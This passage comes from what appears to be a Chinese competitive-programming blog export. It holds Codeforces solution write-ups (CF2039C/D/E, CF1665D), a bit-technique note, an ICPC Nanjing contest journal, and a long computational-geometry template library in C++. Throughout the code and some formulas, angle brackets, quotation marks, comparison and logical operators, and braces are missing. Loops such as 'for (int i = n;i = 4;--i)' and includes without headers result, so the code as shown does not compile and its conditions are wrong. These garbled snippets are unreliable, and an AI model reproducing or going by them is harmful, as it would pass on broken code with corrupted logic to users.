= sumy[fx][fy] - sumy[sx - 1][fy] - sumy[fx][sy - 1] + sumy[sx - 1][sy - 1]; //同一列的公差为 fy - sy + 1 printf (%lld ,sum_x * (fy - sy + 1) + sum_y - s * (1ll * sx * (fy - sy + 1) + sy - 1)); puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2039E Shohag Loves Inversions","path":"/2024/12/11/CF2039E/","content":"题意： 初始时 $a = [0,1]$，每次更新将 $a$ 逆序对的数量 $k$ 插入其中，求最终长度为 $n$ 的序列的数量。 以下均设当前的序列逆序对的数量为 $k$。 首先需要通过观察得出一个性质，当序列第一次出现 $k 1$ 的时候，若将 $k$ 插在中间的位置，会使得 $k’ k$，在末尾插入则 $k’ = k$。设 $f_i$ 表示长度为 $i$ 且当前第一次出现 $k 1$ 时，变为长度为 $n$ 的序列的数量。剩下还有 $n - i$ 次操作，可以将 $k$ 均插入末尾，或者在末尾插入若干个以后再将 $k$ 插入中间的 $i$ 个位置之一，因此可以得到以下转移： f_i = i \\times \\sum \\limits_{j = 0}^{n - i - 1} f_{i + j + 1} + 1现在我们讨论整一个序列均为 $k \\le 1$ 的情况。显然 $k = 0$ 时就只有 $\\underbrace{00 \\cdots 0}_{n - 1}1$ 这一种。而 $k = 1$ 时应为 $\\underbrace{00 \\cdots 0}_{x}010\\underbrace{11\\cdots1}_{n - x - 3}$，其中 $x \\in [0,n - 3]$，故有 $n - 2$ 种。所以说，$k \\le 1$ 时，共有 $n - 1$ 种。 最后考虑 $k \\le 1$ 转移至 $k 1$ 的情况，显然只有 $k = 1$ 时才有可能。因此对于 $\\underbrace{00 \\cdots 0}_{x}010\\underbrace{11\\cdots1}_{n - x - 3}$ 类型的串，我们需要找到第一个 $1$ 所出现的位置。不难发现第一次出现 $k 1$ 的序列时至少由长度为 $3$ 的 $010$ 转移而来，共会产生 $2$ 个长度为 $4$ 且 $k 1$ 的串 $1010,0110$。一般化的，若在长度为 $i$ 时第一次出现 $k 1$，则这个长度为 $i$ 的串共会有 $\\sum \\limits_{j = 2}^{i - 1} = \\frac{i(i - 3)}{2}$ 种情况。举个例子，若 $i = 5$，则可能由 $0010,0101$ 转移出 $5$ 种情况。 综上所述，最后的答案就是 $n - 1 + \\sum \\limits _{i = 4}^n \\frac{i(i - 3)}{2} f_i$。直接后缀和进行处理即可，时间复杂度 $O(n)$。 参考代码： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e6 + 5;const int MOD = 998244353;const ll inv_2 = 499122177;inline int read ();int t,n;ll sum,ans,dp[MAX]; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read (); sum = ans = 0; for (int i = n;i = 4;--i) dp[i] = (i * sum % MOD + 1) % MOD; sum = (sum + dp[i]) % MOD; ans = ans + 1ll * i * (i - 3) % MOD * inv_2 % MOD * dp[i] % MOD; ans = (ans + n - 1) % MOD; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1665D GCD Guess","path":"/2024/12/01/CF1665D/","content":"由数据范围不难想到按位考虑，所以我们尽量把每次询问凑成 $2$ 的幂次相关的数。 在二进制条件下，设最低位为第 $0$ 位。目前要猜测第 $i$ 位的值，设 $t$ 表示前 $i - 1$ 位所贡献的值。令 $a b$，则有（加粗表示第 $i$ 位）： \\begin{cases} t + a \\text{ changes to } \\quad \\textbf{1}0\\cdots 0\\\\ t + b \\text{ changes to } 1\\textbf{1}0\\cdots 0\\ \\end{cases}由公式 $\\gcd (t + a,t + b) = \\gcd (t + a,b - a)$ 可知（加粗表示第 $i$ 位）： \\begin{cases} t + a \\text{ changes to } \\quad \\textbf{1}0\\cdots 0\\\\ b - a \\text{ changes to } 1\\textbf{0}00\\cdots 0\\ \\end{cases}此时 $\\gcd (t + a,b - a) = 2^i$。当实际 $x$ 的第 $i$ 位为 $1$ 时，会产生 $2$ 次进位，使得 $\\gcd (t’ + a,b - a) = 2^{i + 1}$。因此可以得到以下代码： for (int i = 0;i 30;++i)//猜测第 i 位 int ans = query ((1 i) - x,(1 i) + (1 (i + 1)) - x); if (ans == 1 (i + 1)) x |= 1 i;","categories":["Solution"]},{"title":"题解：CF2039D Shohag Loves GCD","path":"/2024/11/27/CF2039D/","content":"从给定集合中选数并构造序列 $\\{a_i\\}$，需要满足 $a_{\\gcd (i,j)} eq \\gcd(a_i,a_j) \\mid \\forall 1 \\le i j \\le n$ 并且构造出的序列字典序最大。 不妨从反面分析，考虑满足 $a_{\\gcd (i,j)} = \\gcd (a_i,a_j)$。当 $i \\mid j$ 时，$\\gcd (i,j) = i$，$a_i \\mid a_j$。进一步的，当 $i mid j$ 时，是否也存在一个 $i$，满足 $a_{\\gcd (i,j)} = \\gcd (a_i,a_j)$ 呢？ 假设存在这个 $i$，我们设 $g = \\gcd (i,j)$，那么 $a_g = \\gcd (a_i,a_j)$ 且 $g i$。由于 $g \\mid i$，等价于 $g = \\gcd (g,i)$，由上面的结论可知 $a_{\\gcd (g,i)} = \\gcd (a_g,a_i)$。此时与题目的条件不符合，故假设不成立。 所以说在构造 $a_i$ 时，只需要考虑序列以 $i$ 的因数（且小于 $i$）为下标的数，预处理因数即可。在构造的时候，我们可以将所有以 $i$ 的因数为下标的数放入 $\\mathrm{set}$ 中，然后从最大的数开始，查找到第一个未出现在集合中的数即可退出循环。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#include set#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int M = 1e5; const int MOD = 1e9 + 7;inline int read ();vector int ans,p[MAX];int t,n,m,a[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); for (int i = 1;i = M;++i) for (int j = i + i;j = M;j += i) p[j].push_back (i);//j 的因数 t = read (); while (t--) n = read ();m = read (); for (int i = 1;i = m;++i) a[i] = read (); sort (a + 1,a + 1 + m);ans.clear (); for (int i = 1;i = n;++i) set int invaild; for (auto item : p[i]) invaild.insert (ans[item - 1]); for (int j = m;j;--j) if (invaild.find (a[j]) == invaild.end ()) ans.push_back (a[j]); break; if (ans.size () != i) break; if (ans.size () != n) puts (-1); else for (auto item : ans) printf (%d ,item);puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2039C Shohag Loves XOR","path":"/2024/11/26/CF2039C/","content":"给定 $x,m$，求有多少 $y$ 满足 $y \\in [1,m]$ 使得 $x \\oplus y$ 可以被 $x$ 或 $y$ 整除。 设 $p = x \\oplus y$，分三种情况讨论： $x | p$。设 $p = kx$，则 $y = x \\oplus p \\le p + x \\le m$，也就是 $kx \\le m - x$，进一步化简可知 $k \\le \\lfloor \\frac{m - x}{x} \\rfloor$。由于我们还有 $(m - x,m]$ 区间未检测，但可以充分利用 $x \\oplus y \\le x + y$ 这个性质，我们循环判断 $(m - x,m + x]$ 区间即可（当然，官方解答的做法更加简洁，但是没看懂）。 $y | p$。当 $0 x y$ 时，$p \\le x + y y + y = 2y$，因此 $p = ky(k \\ge 2)$ 不存在解。因此只需要考虑 $y \\le x$ 的情况。 $x | p$ 且 $y | p$。当 $x eq y$ 时，$\\rm{lcm(x,y)} \\ge 2 \\max (x,y)$，然而 $p 2 \\max (x,y)$，因此只有 $x = y$ 时才能成立。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline ll read ();ll t;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) ll x = read (),n = read (),cnt = (n - x) / x + (n 2 * x x = n); for (ll i = (n - x) / x * x + 1;i = n + x;++i) //枚举 x ^ y if (1 = (i ^ x) (i ^ x) = n i % x == 0) ++cnt; for (ll i = 1;i = min (n,x);++i) // 枚举 y if ((x ^ i) % i == 0) ++cnt; printf (%lld ,cnt - (n = x)); return 0;inline ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"位思想","path":"/2024/11/21/Bits/","content":"Double Sum 2 题意： 求所有有序对一直除以 $2$ 直至为奇数后的值的和。 需要发现一个性质，设 $f_i$ 表示所有能被 $2^i$ 整除的和，则 $f_{i + 1} - f_i$ 表示恰好有 $i$ 个因子 $2$ 的和，那么对于这些和，对答案的贡献就是 $\\dfrac{f_i}{2^i}$。 因此我们对于按位考虑，对于第 $i$ 位，在遍历至 $a_j$ 时设 $sum_{a_j}$ 表示在它之后的与其互补的数的和，$cnt_{a_j}$ 表示与其互补的数的个数（此处互补的定义是与 $a_j$ 相加可以被 $2^i$ 整除，用 $^a_j$ 表示）。因此从后往前遍历即可得到 $f_i = \\sum \\limits_{j = 1}^n a_j \\times cnt_{^a_j} + sum_{^*a_j}$。 代码如下： for (int i = 0;i = 25;++i) int p = 1 i; for (int j = n;j;--j) ++cnt[a[j] % p]; sum[a[j] % p] += a[j]; f[i] += a[j] * cnt[(p - a[j] % p) % p] + sum[(p - a[j] % p) % p]; for (int j = 1;j = n;++j) cnt[a[j] % p] = sum[a[j] % p] = 0;for (int i = 0;i 25;++i) ans += (f[i] - f[i + 1]) / (1 i);","categories":["Algorithm"]},{"title":"ICPC 小白勇闯南京","path":"/2024/11/02/ICPC Nanjing24/","content":"第 49 届 ICPC 南京站游记【$2024.11.2-2024.11.3$】 Day $-2$下午翘课，VP 了 $2022$ 年南京的区域赛。但是大家打得并不是非常认真，最后只过了 $5$ 题。 开局签到，但是我读题加写题花了 $20$ 分钟。看来还是我英语水平不够的问题，好在没有罚时。队友开了一道比签到稍微难点的题，但是卡在背包的正确性上了。我读题后提出先排序然后前部分背包后部分贪心的写法，然后大胆尝试，一发通过。 然后是数学题，直接丢给队友，他们俩讨论了一下，差不多在一个多小时的时候过了这道题。接着队友开图论，我开到了袋鼠题，发现是大模拟，和另一个队友讨论出了一个解法后就让他写了（于是我开始摆烂）。但是，接下去的一个小时，他还不容易写完以后发现过不了编译。看了好几遍以后发现是数组开到了 $10^9$，直接无语，又是一顿改。过样例！交！嗯，怎么 $\\texttt{RE on test2}$？于是我们开始猜测是小数据挂还是空间炸，我果断否定空间炸。然而，在写了个数据生成器后发现单组数据运行全部正确，但组数一多直接炸裂，我丢真是 $\\texttt{vector}$ 的锅（于是队友开始给我上课—凡事不要过早下结论。我：啊吧啊吧，你倒是过了这题啊）。 接下来一直改啊改，用 swap() 和 shrink_to_fit() 但是还是 $\\texttt{RE on test2}$，直接红温。期间我开了 $\\texttt{M}$ 题，发现是数据结构并想到了解法。异想天开用链表去维护，然后直接输出了一堆负数，再次红温… 就这样到比赛结束，写了 $7$ 题，但是只过了 $5$ 题…… Day $-1$在 CEC 课上补题，把队友之前模拟写 $\\texttt{RE}$ 的代码直接全删了，然后按自己的想法写了一次，$20$ 分钟直接过了。难不成是在课上写题有加成？ 定了周五下午的飞机，但在晚上收到飞机延误到傍晚的消息，于是果断（免费）改签到了中午。哎，这不正合我意！ Day $0$$12:50$ 的飞机是 $13:15$ 飞的，问题不大。 看到今晚有 $\\texttt{CF div2}$，果断报名，希望别掉分。 晚上 $\\texttt{CF}$，$\\texttt{B}$ 题看错题目，然后变成一道超难题，于是一直在死磕直到……一小时后突然发现是中位数而非平均数。 戏剧性的，每道题都有罚时，然后 $\\texttt{D}$ 赛后才对，于是降大分。（是不是从另一方面说明后天不再会看错题了） Day $1$趁着队友还没到，先去签到处附近薅羊毛！收获一把雨伞，一件纪念款衣服，一个背包，一个台灯，一个吹风机外加一个多功能闹钟。 快到中午，队友才（一点疲惫地）到酒店，然后直接去签到。同时，也奠定了下午热身赛要烂的节奏。下午赛前在学校里随便逛逛，看了大灰机。 两点进入到体育馆中，收获了属于自己的阔爱袋鼠！听裁判长发言，这次有中文题面好评！但旁边是北京大学，压力拉满差评！然后就开始热身赛了，发现是没用过的 $\\texttt{linux}$ 系统，捣鼓了很久才找到 $\\texttt{vscode}$，又弄了很久终于可以输入输出…… 热身赛全部都是历年的袋鼠题，胡出来四道题目，然后在写第三题时一直超时（然而在 CF 上也是这么写的却能过），于是直接摆烂不写。我们三人分别开始睡觉、玩手机、发呆……结束时发现不少队伍直接 AK，感觉明天要完（）。 【说句闲话，每人发了 $25$ 元的餐券三张，却发现很难用完，第一次想要食堂的物价高一点……】 Day $2$比赛开始，不知怎的非常紧张。我先开了签到，但是以为是字符串哈希，但是我对字符串哈希并不是特别的熟悉，于是把题目丢给队友。致命的是，我在传达时对子序列和子串没有特别的强调，导致队友在写 $\\texttt{KMP}$，而这一写就是半小时。等我恍然大悟的时候，和队友说了，于是开始修修补补，过样例交上去还挂了。还是我上去写了，最后在 $1.5$ 小时才过。这时候我们其实完全的慌了，毫无节奏可言。 看 $\\texttt{B}$ 认为是一道动归，然后疯狂写转移表达式。看 $\\texttt{G}$ 又感觉像是动归，认为不会。另一个队友开 $\\texttt{J}$，是简单贪心但是细节超多，不断缝缝补补然后一直过不了样例。我尝试了 $\\texttt{G}$，想了同深度两点询问的做法，但是交上去 WA，发现链的情况直接退化到 $n$ 次。然后想要找重心式询问，但发现链仍能被 hack。 队友写 $\\texttt{J}$ 然后一直调不对，直接打印换队友写 $\\texttt{B}$。写了超级久最后被样例 $4$ 卡了，直接发现是假做法。好不容易改过了 $\\texttt{J}$，这时候已经 $4$ 小时了。 我又想了一个每次询问直径两端的做法，但是在细节上并没有处理的很清楚，能不能在 $\\lfloor \\log_2 n \\rfloor$ 完成询问其实心里完全没底，还是上去敲了代码，但是有运行错误，到赛后也调出来。 于是，$2$ 题结束我们第一次的 ICPC，并拿到了铁牌。 后记总的来说，这是一次完全失败的比赛，我们有效做题的时间不超过 $1.5$ 小时。非常奇怪，我们一上来连签到题都开始讨论。然后，由于我们口胡惯了，想不仔细，所以出现了多次题目想假，代码打补丁的情况，这是致命的。 还有就是比赛的节奏是尤其重要的，像上次网络赛我们打了 $7$ 题，就是非常的顺，机上机下协调的都是非常好，几乎没有出现空机的情况，这也是为什么我们可以做出这么多题目的原因。 还有一周就是 CCPC 重庆站，赶紧趁着这周再练习调整一下，加油吧！ 彩蛋回去的时候在机场和队友玩 QQ 飞车，然后一人一局相互破纪录，简直逆天。 赛后补题 $\\texttt{K}$ 其实就是简单贪心。显然的是每次在黑色块的地方切开，就像是多组数据。对于每个需要处理的区间，先从左往右扫，每次放纸条的地方显然是有红色的块最优。放完以后需要检验右端是否在范围内。若在范围之外，则需要从右往左再次扫一遍，进行纸条的调整。可以发现，即使纸条经过调整，数量仍然是不变的。最后，如果最左侧的纸条仍在范围内，则有解。核心代码如下： void solve (int l,int r,int w) if (l r) return ; int cnt = 0,p = l; while (w = n a[w] = r) paper[++cnt] = a[w]; p = a[w] + k; while (w = n a[w] p a[w] = r) ++w; if (!cnt) return ; paper[cnt] -= max (0,paper[cnt] + k - 1 - r); int tmp = cnt; while (tmp 1) paper[tmp - 1] -= max (0,paper[tmp - 1] + k - paper[tmp]),--tmp; if (paper[tmp] l) ok = 0; return ; for (int i = 1;i = cnt;++i) ans.push_back (paper[i]); $\\texttt{B}$ 感觉很 $\\texttt{Ad-hoc}$。先将字符串中所有偶数的位置上的数字取反，问题就等价于为每次删去两个相邻且相同的字符。不难发现得到的串一定全部为 $0$ 或 $1$，而每一次删除的数都是一个 $0$ 一个 $1$，因此最优情况就是把 $2$ 尽可能给数量少的一方。最后的答案即为差值。但如果写动态规划，就会发现状态的转移非常的复杂，反正赛场上是没写出来。 核心代码如下： for (int i = 1;i = n;++i) if (s[i] == 2) ++cnt[2]; else if (i % 2 == 0) ++cnt[(s[i] - 0) ^ 1]; else ++cnt[s[i] - 0];for (int i = 1;i = cnt[2];++i) if (cnt[0] cnt[1]) ++cnt[0]; else ++cnt[1];printf (%d ,abs (cnt[0] - cnt[1])); 类似题目 Folding Strip","categories":["Journal"]},{"title":"计算几何 学习笔记","path":"/2024/10/30/Geometry/","content":"跟着这个题库完善自己的模板。 三角库函数sin(x)/cos(x)/tan(x) 三角函数 asin(x)/acos(x)/atan(x) 反三角函数 atan2(x,y) 返回点 $(x,y)$ 的反正切值，以弧度为单位。返回值的范围是 $[-\\pi,\\pi]$（扩展到四个象限），与 atan(x) 的具体区别如下： 每种函数关于精度问题有三种写法，以 atan2(x,y) 为例： double atan2 (double y, double x);float atan2f (float y, float x);long double atan2l (long double y, long double x); acos (-1.0) 计算 $\\pi$ 的值。 极角排序的应用 极角 一般以原点为中心，$x$ 正半轴为始边，逆时针转过的角度（$\\theta \\in [0,2\\pi]$）。 极角排序（第三象限 $\\lt$ 第四象限 $\\lt$ 第一象限 $\\lt$ 第二象限） 利用 atan(x,y) 直接排序（精度较低） for (int i = 1;i = n;++i) a[i] = atan2l (y[i],x[i]);sort (a + 1,a + 1 + n); 利用叉积排序 根据 $A,B,O$ 围成的面积（存在正负）即可判断。若面积为正，则 $B$ 在 $A$ 的正方向（当然，角度小于 $\\pi$）；反之亦然。 bool cmp (Point x, Point y) Point p(0, 0); // 极点 Point v1 = a - p,v2 = b - p; if (v1 ^ v2 == 0) return a.x b.x;//共线 else return v1 ^ v2 0; 先按照象限区分，然后按照极角排序【需要包含坐标轴】 int Qua (Point a) if (a.x 0 a.y = 0) return 1; if (a.x = 0 a.y 0) return 2; if (a.x 0 a.y = 0) return 3; if (a.x = 0 a.y 0) return 4;bool cmp (Point a,Point b) if (Qua (a) == Qub (b)) return atan2l (a.y,a.x) atan2l (b.y,b.x); else return Qua (a) Qua (b); 【例题】 [ICPC2021 Macao R] Laser Trap 本质是三点能不能形成一个包围住原点的三角形。那么就可以先极角排序，然后用双指针，如果两点的极点差值小于 $\\pi$，那么就不会经过原点，可以保留。为了方便书写代码，可以破环为链。同时，这道题需要注意精度问题。核心代码如下： for (int i = 1;i = n;++i) a[i + n] = a[i] + 2 * pi;//pi = acosl(-1);for (int i = 1;i = n;++i) while (p = 2 * n a[p] - a[i] pi) ++p; ans = min (ans,p - 1 - i); Computational Geometry(2D) using LD = long double;const LD pi = acos (-1.0);const LD eps = 1e-8;int dcmp (LD x) return x -eps ? -1 : (x eps ? 1 : 0);struct Point LD x,y;Point (LD x = 0,LD y = 0) : x (x),y (y) ;struct Circle Point O;LD r;Circle (Point O = Point (),LD r = 0) : O (O),r (r) ;typedef Point Vector;Vector operator + (Vector A,Vector B) return Vector (A.x + B.x,A.y + B.y);Vector operator - (Vector A,Vector B) return Vector (A.x - B.x,A.y - B.y);Vector operator * (Vector A,LD k) return Vector (A.x * k,A.y * k); Vector operator / (Vector A,LD k) return Vector (A.x / k,A.y / k);bool operator == (Vector A,Vector B) return dcmp (A.x - B.x) == 0 dcmp (A.y - B.y) == 0;bool operator != (Vector A,Vector B) return !(A == B);LD dot (Vector A,Vector B) return A.x * B.x + A.y * B.y; LD dis (Point A,Point B) return sqrt ((A.x - B.x) * (A.x - B.x) + (A.y - B.y) * (A.y - B.y)); LD cross (Vector A,Vector B) return A.x * B.y - A.y * B.x; // A - B counter-clockwise if cross (A,B) 0LD len (Point A) return sqrt (A.x * A.x + A.y * A.y);LD angle (Vector A,Vector B) return acos (dot (A,B) / (len (A) * len (B)));Vector proj (Vector A,Vector B) return A * (dot (A,B) / dot (A,A)); // project onto APoint foot (Point P,Point A,Point B) Vector AP = P - A,AB = B - A;return A + proj (AB,AP); // footPoint reflect (Point P,Point A,Point B) Point F = foot (P,A,B);return F * 2 - P; // symmetry pointPoint rotate (Point P,LD theta) return (Point)P.x * cos (theta) - P.y * sin (theta),P.x * sin (theta) + P.y * cos (theta); // counterclockwise bool chk_on_line (Point P,Point A,Point B) return dcmp (cross (P - A,B - A)) == 0; // judge whether on line ABbool chk_on_seg (Point P,Point A,Point B) return chk_on_line (P,A,B) dcmp (dot (P - A,P - B)) = 0; // judge whether on segment ABLD dis_seg (Point P,Point A,Point B) // the distance from point P to segment AB. if (dcmp (dot (B - A,P - A)) 0) return dis (P,A); if (dcmp (dot (A - B,P - B)) 0) return dis (P,B); return fabs (cross (P - A,P - B)) / dis (A,B);Point ll_inter_pt (Point A,Point B,Point C,Point D) return A + (B - A) * cross (C - A,D - C) / cross (B - A,D - C);bool chk_ll_inter (Point A,Point B,Point C,Point D) return dcmp (cross (B - A,D - C)) != 0; // line - linebool chk_ls_inter (Point A,Point B,Point C,Point D) return chk_on_line (ll_inter_pt (A,B,C,D),C,D); // The intersection of AB(line) and CD (line) is on the CD (seg).bool chk_ss_inter (Point A,Point B,Point C,Point D) // seg - seg LD c1 = cross (B - A,C - A),c2 = cross (B - A,D - A); LD d1 = cross (D - C,A - C),d2 = cross (D - C,B - C); if (dcmp (c1) * dcmp (c2) 0 dcmp (d1) * dcmp (d2) 0) return true; if (dcmp(c1) == 0 chk_on_seg (C,A,B)) return true; if (dcmp(c2) == 0 chk_on_seg (D,A,B)) return true; if (dcmp(d1) == 0 chk_on_seg (A,C,D)) return true; if (dcmp(d2) == 0 chk_on_seg (B,C,D)) return true; return false;bool SameSide (Point A,Point B,Point C,Point D) return cross (A - C,D - C) * cross (D - C,B - C) 0; // Point A,B Line C,DLD area (vector Point P) int n = P.size (); LD res = 0; for (int i = 0;i n;++i) res += cross (P[i],P[(i + 1) % n]); return res / 2.0;bool is_convex (vector Point P) int n = P.size (); for(int i = 0;i n - 1;++i) if (dcmp (cross (P[i + 1] - P[i],P[(i + 2) % n] - P[i])) 0) return false; return true;int in_Poly (vector Point P,Point A) // O (n) for any polygons int cnt = 0,n = P.size (); for (int i = 0;i n;++i) int j = (i + 1) % n; if (chk_on_seg (A,P[i],P[j])) return 2;// on the edge if (A.y = min (P[i].y,P[j].y) A.y max (P[i].y,P[j].y)) // the intersection is on the right cnt += dcmp (((A.y - P[i].y) * (P[j].x - P[i].x) / (P[j].y - P[i].y) + P[i].x) - A.x) 0; return cnt 1;int in_convex_Poly (vector Point P,Point A) // O (log n) only for convex polygons int n = P.size (); if (chk_on_seg (A,P[0],P[1]) || chk_on_seg (A,P[0],P[n - 1])) return 2; if (dcmp (cross (P[n - 1] - P[0],A - P[0])) 0 || dcmp (cross (P[1] - P[0],A - P[0])) 0) return 0; int l = 1,r = n - 2,res = -1; while (l = r) int mid = (l + r) 1; if (dcmp (cross (P[mid] - P[0],A - P[0])) = 0) res = mid,l = mid + 1; else r = mid - 1; if (chk_on_seg (A,P[res],P[res + 1])) return 2; if (dcmp (cross (P[res + 1] - P[res],A - P[res])) 0) return 0; return 1;auto convex_hull (vector Point P) // strict convex hull (= 0) int n = P.size (); sort (P.begin (),P.end (),[] (Point x,Point y) return x.x == y.x ? x.y y.y : x.x y.x;); vector Point hull; hull.resize (2 * n + 1); int k = 0; for (int i = 0;i n;++i) while (k = 2 dcmp (cross (hull[k - 1] - hull[k - 2],P[i] - hull[k - 2])) = 0) --k; hull[k++] = P[i]; for (int i = n - 2,t = k;i = 0;--i) while (k t dcmp (cross (hull[k - 1] - hull[k - 2],P[i] - hull[k - 2])) = 0) --k; hull[k++] = P[i]; hull.resize (k - 1); return hull;LD diameter (vector Point P) int n = P.size (); if (n = 1) return 0; if (n == 2) return len (P[1] - P[0]); LD res = 0; for (int i = 0,j = 2;i n;++i) while (dcmp (cross (P[(i + 1) % n] - P[i],P[j] - P[i]) - cross (P[(i + 1) % n] - P[i],P[(j + 1) % n] - P[i])) = 0) j = (j + 1) % n; res = max (res,max (len (P[j] - P[i]),len (P[j] - P[(i + 1) % n]))); return res;template typename Line = pair Point, PointLD half_plane (vector Line Vec) int n = Vec.size (); auto get_angle = [] (Line line) - LD return atan2 (line.second.y - line.first.y,line.second.x - line.first.x);; sort (Vec.begin (),Vec.end (),[] (Line A,Line B) LD angA = get_angle (A),angB = get_angle (B); return fabs (angA - angB) eps ? angA angB : cross (A.second - A.first,B.second - A.first) 0; ); int h = 1,t = 0; auto check = [] (Line x,Line y,Line z) - bool Point P = ll_inter_pt (y.first,y.second,z.first,z.second); return dcmp (cross (x.second - x.first,P - x.first)) 0; ; vector Line q (n + 10);q[++t] = Vec[0]; for (int i = 1;i n;++i) if (get_angle (Vec[i]) - get_angle (Vec[i - 1]) eps) continue; while (h t check (Vec[i],q[t],q[t - 1])) --t; while (h t check (Vec[i],q[h],q[h + 1])) ++h; q[++t] = Vec[i]; while (h t check (q[h],q[t],q[t - 1])) --t; q[++t] = q[h]; vector Point p; for (int i = h;i t;++i) p.push_back (ll_inter_pt (q[i].first,q[i].second,q[i + 1].first,q[i + 1].second)); return area (p);vector Point minkowski (vector Point vecA,vector Point vecB) int n = vecA.size (),m = vecB.size (); vector Point A (n),B (m),C vecA[0] + vecB[0]; for (int i = 0;i n;++i) A[i] = vecA[(i + 1) % n] - vecA[i]; for (int i = 0;i m;++i) B[i] = vecB[(i + 1) % m] - vecB[i]; int posa = 0,posb = 0; while (posa n || posb m) if (posa == n) C.push_back (C.back () + B[posb++]); else if (posb == m) C.push_back (C.back () + A[posa++]); else if (dcmp (cross (A[posa],B[posb])) = 0) C.push_back (C.back () + A[posa++]); else C.push_back (C.back () + B[posb++]); return convex_hull (C);bool chk_in_cir (Circle C,Point P) return dcmp (len (P - C.O) - C.r) = 0;Point get_cir_pt (Circle C,LD theta) return C.O.x + C.r * cos (theta),C.O.y + C.r * sin (theta);int chk_lc_inter (Point A,Point B,Circle C) LD d = dis_seg (C.O,A,B); if (dcmp (d - C.r) == 0) return 0; // tangent if (dcmp (d - C.r) 0) return -1; // separation return 1; // intersectionint chk_cc_inter (Circle A,Circle B) // the number of tagent lines LD d = len (A.O - B.O); if (dcmp (A.r + B.r - d) 0) return 4; // externally separate if (dcmp (A.r + B.r - d) == 0) return 3; // externally tangent if (dcmp (fabs (A.r - B.r) - d) == 0) return 1; // internally tangent if (dcmp (fabs (A.r - B.r) - d) 0) return 0; // one circle inside the other return 2; // intersectionpair Point,Point lc_inter (Point A,Point B,Circle C) Point F = foot (C.O,A,B);LD d = dis (C.O,F); Vector E = (B - A) / dis (A,B); Point P1 = F - E * sqrt (C.r * C.r - d * d); Point P2 = F + E * sqrt (C.r * C.r - d * d); return P1,P2;pair Point,Point cc_inter (Circle A,Circle B) Vector k = B.O - A.O; LD d = len (k); LD alpha = atan2 (k.y,k.x),beta = acos ((A.r * A.r + d * d - B.r * B.r) / (2 * A.r * d)); Point P1 = get_cir_pt (A,alpha - beta),P2 = get_cir_pt (A,alpha + beta); return P1,P2;pair Point,Point tan_cir (Point P,Circle C) LD d = len (C.O - P),theta = asin (C.r / d); Vector E = (C.O - P) / d; Vector P1 = P + (rotate (E,theta) * sqrt (d * d - C.r * C.r)); Vector P2 = P + (rotate (E,-theta) * sqrt (d * d - C.r * C.r)); return P1,P2;Circle tri_incir (Point A,Point B,Point C) LD a = dis (B,C),b = dis (A,C),c = dis (A,B); Point O = (A * a + B * b + C * c) / (a + b + c); return O,dis_seg (O,A,B);Circle tri_circum (Point A,Point B,Point C) LD Bx = B.x - A.x,By = B.y - A.y,Cx = C.x - A.x,Cy = C.y - A.y; LD D = 2 * (Bx * Cy - By * Cx); LD x = (Cy * (Bx * Bx + By * By) - By * (Cx * Cx + Cy * Cy)) / D + A.x; LD y = (Bx * (Cx * Cx + Cy * Cy) - Cx * (Bx * Bx + By * By)) / D + A.y; Point P (x,y); return Circle (P,dis (A,P));auto get_tangents (Circle A,Circle B) vector pair Point,Point tangents; LD d = len (A.O - B.O),dif = A.r - B.r,sum = A.r + B.r; if (dcmp (d - fabs (dif)) 0) return tangents; LD base = atan2 (B.O.y - A.O.y,B.O.x - A.O.x); if (dcmp (d - fabs (dif)) == 0) tangents.push_back (get_cir_pt (A,base + (A.r B.r ? pi : 0)),get_cir_pt (A,base + (A.r B.r ? pi : 0))); return tangents; LD theta = acos (dif / d); tangents.push_back (get_cir_pt (A,base + theta),get_cir_pt (B,base + theta)); tangents.push_back (get_cir_pt (A,base - theta),get_cir_pt (B,base - theta)); if (dcmp (d - sum) == 0) tangents.push_back (get_cir_pt (A,base),get_cir_pt (A,base)); if (dcmp (d - sum) 0) theta = acos (sum / d); tangents.push_back (get_cir_pt (A,base + theta),get_cir_pt (B,base + theta + pi)); tangents.push_back (get_cir_pt (A,base - theta),get_cir_pt (B,base - theta + pi)); return tangents;LD tri_cir_area (Point A,Point B,Circle C) Vector OA = A - C.O,OB = B - C.O; LD S = cross (OA,OB),sign = dcmp (cross (OA,OB)) 0 ? 1 : -1; bool da = dcmp (len (OA) - C.r) 0,db = dcmp (len (OB) - C.r) 0; if (dcmp (S) == 0) return 0; if (da db) return S * 0.5; // triangle if (!da !db) if (chk_lc_inter (A,B,C) == 1)// arc + triangle + arc auto [P1,P2] = lc_inter (A,B,C); Vector OP1 = P1 - C.O,OP2 = P2 - C.O; if (dis (A,P1) dis (A,P2)) swap (P1,P2); return cross (OP1,OP2) * 0.5 + sign * 0.5 * C.r * C.r * (angle 